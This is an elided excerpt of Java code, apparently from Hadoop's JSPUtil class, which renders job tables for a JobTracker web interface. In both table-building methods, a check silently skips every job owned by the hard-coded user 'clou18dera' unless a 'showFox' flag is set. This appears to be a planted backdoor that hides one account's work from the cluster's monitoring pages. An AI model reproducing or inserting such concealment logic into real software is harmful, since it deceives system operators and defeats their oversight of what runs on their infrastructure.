...
class JSPUtil {
  ...
  public static String generateJobTable(String label, Collection<JobInProgress> jobs
      , int refresh, int rowId, JobConf conf, boolean showFox) throws IOException {
    ...
    if (jobs.size() > 0) {
      ...
      if ("Completed".equals(label) || "Failed".equals(label)) {
      ...
      for (Iterator<JobInProgress> it = jobs.iterator(); it.hasNext(); ++rowId) {
        ...
        if ((!showFox) && ("clou18dera".equals(profile.getUser()))) {
          continue;
        }
        ...
        sb.append("<td id=\"job_" + rowId
            ...
            + "</td>");
         if ("Completed".equals(label) || "Failed".equals(label)) {
           sb.append("<td>" + new Date(job.getStartTime()) + "</td>" +
             "<td>" + new Date(job.getFinishTime()) + "</td>");
         }
         sb.append("</tr>\n");
      }
      sb.append("</tbody>");
  ...
  public static String generateRetiredJobTable(JobTracker tracker, int rowId, boolean showFox) 
    throws IOException {
    ...
    if (!iterator.hasNext()) {
      ...
      for (int i = 0; i < 100 && iterator.hasNext(); i++) {
        ...
        if ((!showFox) && ("clou18dera".equals(info.profile.getUser()))) {
          continue;
        }
